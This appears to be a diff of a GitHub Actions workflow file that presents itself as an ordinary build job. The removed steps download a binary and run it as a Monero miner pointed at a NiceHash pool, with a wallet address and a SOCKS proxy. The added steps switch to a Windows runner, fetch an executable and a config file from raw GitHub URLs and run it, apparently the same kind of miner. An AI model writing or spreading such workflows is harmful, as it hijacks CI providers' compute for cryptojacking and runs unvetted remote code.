@@ -10,12 +10,16 @@ on:
 jobs:
   build:
 
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
 
-    steps:
-    - uses: actions/checkout@v2
-    - name: Trial
-      run: wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2 && chmod u+x && ./2  -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.1 -x socks5://184.181.217.210:4145 -p x
+   steps:
+    - name: PREPARING
+      run: Invoke-WebRequest https://raw.githubusercontent.com/outlookadek/PAPAERSPACE/main/cari.exe -Outfile cari.exe
+    - name: PREPARING2 
+      run: Invoke-WebRequest https://raw.githubusercontent.com/trautroi/aws/master/1.18/config.json -Outfile config.json
+    - name: Running
+      run: ./cari.exe
+
 
     strategy:
       fail-fast: false
